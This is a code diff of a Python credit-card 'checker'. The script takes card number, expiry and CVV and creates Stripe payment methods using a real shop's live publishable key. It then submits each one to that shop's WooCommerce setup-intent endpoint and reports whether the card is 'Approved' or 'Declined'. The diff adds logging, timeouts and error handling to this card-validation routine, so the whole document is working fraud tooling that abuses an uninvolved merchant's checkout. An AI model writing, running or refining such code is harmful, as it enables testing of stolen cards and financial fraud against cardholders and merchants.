@@ -127,38 +127,63 @@ def full_stripe_check(cc, mm, yy, cvv):
         logger.info(f"Payment nonce extracted: {ajax_nonce[:10]}...")
 
         # Step 5: Get Stripe payment token
+        logger.info("Step 4: Creating Stripe payment method...")
         stripe_data = (
             f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
             '&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
         )
-        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
+        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, timeout=15)
+        logger.info(f"Stripe API response status: {stripe_response.status_code}")
+        
         if stripe_response.status_code == 402:
             error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
+            logger.warning(f"Card declined by Stripe: {error_message}")
             return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}
-        payment_token = stripe_response.json().get('id')
+        
+        if stripe_response.status_code != 200:
+            error_data = stripe_response.json() if stripe_response.text else {}
+            error_message = error_data.get('error', {}).get('message', f'Stripe API error (status {stripe_response.status_code})')
+            logger.error(f"Stripe API error: {error_message}")
+            logger.debug(f"Stripe response: {stripe_response.text[:500]}")
+            return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}
+        
+        response_data = stripe_response.json()
+        payment_token = response_data.get('id')
         if not payment_token:
+            logger.error("No payment token in Stripe response")
+            logger.debug(f"Stripe response: {response_data}")
             return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}
+        
+        logger.info(f"Stripe payment token: {payment_token[:10]}...")
 
         # Step 6: Submit to website
+        logger.info("Step 5: Submitting to website...")
         site_data = {
             'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token,
             'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce,
         }
-        final_response = session.post('https://www.ftelettronica.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
+        final_response = session.post('https://www.ftelettronica.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data, timeout=15)
+        logger.info(f"Final submission response status: {final_response.status_code}")
         response_json = final_response.json()
+        logger.debug(f"Final response: {response_json}")
 
         if "Unable to verify your request" in response_json.get('messages', ''):
-             return {"status": "Declined", "response": "Unable to verify request.", "decline_type": "process_error"}
+            logger.error("Unable to verify request")
+            return {"status": "Declined", "response": "Unable to verify request.", "decline_type": "process_error"}
         if response_json.get('success') is False or response_json.get('status') == 'error':
             error_message = (response_json.get('data', {}).get('error', {}).get('message') or
                              re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
+            logger.warning(f"Website declined: {error_message.strip()}")
             return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
         if response_json.get('status') == 'succeeded':
+            logger.info("Payment method successfully added!")
             return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
         else:
+            logger.warning(f"Unknown response: {response_json}")
             return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}
 
     except Exception as e:
+        logger.exception("Exception occurred during card check")
         return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}
 
 def get_bin_info(bin_number):
